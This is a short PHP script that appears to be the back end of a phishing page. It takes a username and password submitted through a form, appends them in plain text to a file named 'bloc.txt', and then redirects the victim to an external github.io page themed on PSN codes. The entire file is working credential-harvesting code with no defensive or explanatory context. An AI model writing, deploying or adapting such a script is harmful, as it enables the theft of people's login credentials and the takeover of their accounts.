<?php
$n = $_POST['nome'];
$p = $_POST['pass'];
$dati = "Username: ";
$dati .= $n;
$dati .= " - Password: ";
$dati .= $p;
$dati .= "\n\n";

$var=fopen("bloc.txt","a");
fwrite($var,$dati);
fclose($var);

header("location: https://psn-codes.github.io/triix.html")
?>